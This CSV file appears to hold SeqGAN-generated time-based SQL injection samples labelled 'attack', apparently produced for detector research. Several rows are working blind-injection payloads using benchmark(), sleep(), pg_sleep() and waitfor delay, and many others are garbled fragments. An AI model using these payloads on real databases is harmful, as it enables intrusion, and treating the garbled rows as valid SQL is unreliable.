label,payload,family,payload_type,method,run_id,sample_index
attack,      r   y  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,30
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,31
attack,"1"" and or e=  =    and #  select",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,32
attack,1hz'  =  '   pi'  =  '  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,33
attack,4240    1915  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,34
attack,"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '[' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'a"" like ""zvto   7279",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,35
attack,"  5000000,m  (  )'a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,36
attack,5,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,37
attack,   yq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,38
attack,"1%hyyino1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '1%'  )   waitfor delay 'X1y--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,39
attack,1'Ry,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,40
attack,"1'  )   waitfor delay '' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'h",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,41
attack,1  '    )   )    av,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,42
attack,"5 6793mdmdiinrnz""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,43
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'fystcyftw        lisidkihpynztph,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,44
attack,"1"" where pg_sleep  0x694a4745   (    5s "" 2388,=  select and orwyp dkeland 6969  5000000a)  and #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,45
attack,1liqkbf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,46
attack, 6969 9649 where 'yfvu' 6969 e where 8667 where 8507a where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,47
attack,"1""  )   )    'f'  =  'fzvw",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,48
attack,1'||  (  select '0:    (      ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,49
attack,"1""rh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,50
attack,"1'k' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,51
attack,select(  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,52
attack,"1b"" afry",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,53
attack,1oxn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,54
attack,15'  =  'ot   yy  p,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,55
attack,1'  )   a' ar    f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,56
attack,1210d  'fy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,57
attack,1%hnprtlwhpt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,58
attack,"1%0r  ""uvzc"" 6793  =    (     o  )    ands",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,59
attack,1'nt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,60
attack,"1%'||  (  select '""   )    )    rlike sleep  (  5  )   and    (    (   ""qa#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,61
attack,  5',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,62
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""   )    )(  =  vzf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,63
attack,ddip,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,64
attack,1 like )    or where where 6793mkddk\mdiv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,65
attack,up'fegp'o'  =  '  zlrt fwr,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,66
attack,"1"",0x544d5a4c    --'  =  'opcip'  =  'z",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,67
attack,fwnst  r  = orszzzrwz)   oi0kelbmi:1568  )  lo  )lo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,68
attack,1'  =  '   y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,69
attack,1 or 8514  (  '   avIelts y)    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,70
attack,1%'hwcwi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,71
attack,"1%%' like '' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ''  =  ''  =  'th",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,72
attack,"1'  )   waitfor delay ':'  =  '    kwhereaygCi <> where 8514  3114  select from,' &5  )    )  s",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,73
attack,1'  )   waitfor delay '0:kby,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,74
attack,'  =  '    f    where 2388t  selectl  (  =    )   a    xodd    )    and wheremdf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,75
attack,'  select or,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,76
attack,1'  )   )    )    )    )   and )   a where from=  select pg_sleep  (      p  (  =  =  )     )    and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,77
attack,  =  =select    sselect benchmark sleep  select  =  ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,78
attack,' where 1241  =  1241 waitfor delay ' sleep  select 6175    )   and t    (  #)  0x694a47452388m  =  6272   u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,79
attack,1915,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,80
attack,nhw-- bjf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,81
attack,1   where sleep  5   anc,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,82
attack,1 '0:0:5'a)    )    and   acv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,83
attack,"1',ff",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,84
attack,"1%""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,85
attack,1'wa,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,86
attack,"1hl, where from pg_sleep  (  )    a sleepffsmd a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,87
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,88
attack,"1%0:0:0d:""  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,89
attack,1%%'wyvx'zot,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,90
attack,1'    select where 9649 from   )    )   r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,91
attack,1 8466 where 6793  =,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,92
attack,1 and from5   )    )    as where or 4240  0x4c4d6142    )    )    astyu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,93
attack,1'   ynh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,94
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ''  )   waitfor delay 'ny'  =  'w' like 'gt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,95
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ''+  (  select 'S[m  select or from 6969  (  1915,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,96
attack,::p        )    )   (  )    and0fuwy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,97
attack,f1'   )    )     )   and sleep  (  5  )   and    (    (     (  ' 'aa,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,98
attack,1'  )   waitfor delay 'y  select or sleep  5  e# where delay  =  sleep from8   )   )   )    )    aswkpg_sleepo  )     )    p'wyvx'    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,99
attack,"1""       50000000  (  =  =  1210   )    )   )    p or (   ^  select wheremkmd5  y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,100
attack,n'  )   waitfor delay 'ah   where --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,101
attack,1'  )   waitfor delay 'pbob,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,102
attack,11132 e 4le      emkpthsti'  )    as 'wyvx'      <> from    )    or(  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,103
attack,1'#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,104
attack,1'nr,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,105
attack,1' pg_sleepp  5   y vtnifz0r'  =  ''  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,106
attack,1h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,107
attack,za  where where 6383 8514 andsnnip,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,108
attack,nh' like 'p,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,109
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '  jhh'srs vk)  est,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,110
attack,1 and from 8594  mmd  =  =    'p,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,111
attack,"1%m' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pkes elt   y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,112
attack,1'   =  5    )    )   )   )  aw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,113
attack,1  6967aw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,114
attack,'aq a or or )    syyqcav,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,115
attack,"1""  "" where 6793 where 6793   (  # y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,116
attack,1=  =    ( and    aas6272ys'zo |--y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,117
attack,"1%""  =  ""0q  )   or ' and   (  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,118
attack,1%xmiynzhhyyyq     a,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,119
attack,1%orast,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,120
attack,"no""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""h",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,121
attack,1%hxp f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,122
attack,o1 or or b   where9008  select  5    as'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,123
attack,pan fhw'  =  'n uoefv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,124
attack,1%oavpxih00x694a4745select 2239  =  sleep  ) and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,125
attack,hnlhp2hfin2388h'  =  ''  =  'ip'  =  'zk,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,126
attack,1'a,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,127
attack,"1%%""wucy""  a ""wucy"" 4683 select  =  1210d e'||  (  select 'n",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,128
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'zs0:0"" like """" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""k9649select#    (  =wq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,129
attack,"1""and or dwhere 'sa'  sleep  =  )    )    and 7196 where from sleep   or   (  )    e    and    (  select  v where 7305  n",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,130
attack,1w2239io,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,131
attack,1'+  (  select 'u'  =  'nvwmvpfiy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,132
attack,  0/,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,133
attack,1%%ys,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,134
attack,1'st    if 8507  kpkv'rmifo'+  (  select 'jjh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,135
attack,6967'  =  'thr`t    )   )lt  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,136
attack,1%%[ic'  =  'h ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,137
attack,1    )   yao,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,138
attack,1%r where 8507 like  select t   6175     )  8594knka,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,139
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '"")  )   sdiiqc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,140
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'h Ws%p'  =  ''  =  '   (  vwhf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,141
attack,hr,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,142
attack,1'  )   waitfor delay 'd:ypip,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,143
attack,"li"" like ""'  )   waitfor delay ''   )    )     )   and sleep  (  5  )   and    (    (     (  ''  =  'yazlt   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,144
attack,'  )   waitfor delay 'xdpooti,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,145
attack,"1  (  5000000,md' where 1241  =  1241 waitfor delay '5874    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,146
attack,"1 ""  5efn ar",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,147
attack,"  (e and  (    =  select fromsleep  and eld""na",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,148
attack,m:od5pi1cb,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,149
attack,"1%'  y0:and'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,150
attack,"1'   where k  5000000,m  7021",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,151
attack,  5   'vy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,152
attack,"1 '  )   waitfor delay '4' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pwhere",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,153
attack,1%  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,154
attack,1w9008 or ast and  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,155
attack,"1%%'  )   waitfor delay ':0:8507 1210 where ,m5  )    a  )    or 7196    )   )    as",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,156
attack,"zt  (  benchmark  ""uvzc""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,157
attack,11' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'o  'hv'  =  'vasnohfff,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,158
attack,1%hfwy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,159
attack,ike 7305  =,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,160
attack,1%%clha,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,161
attack,"' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'aw1n",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,162
attack,t,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,163
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '^' and    (    (     (  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,164
attack,ikfv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,165
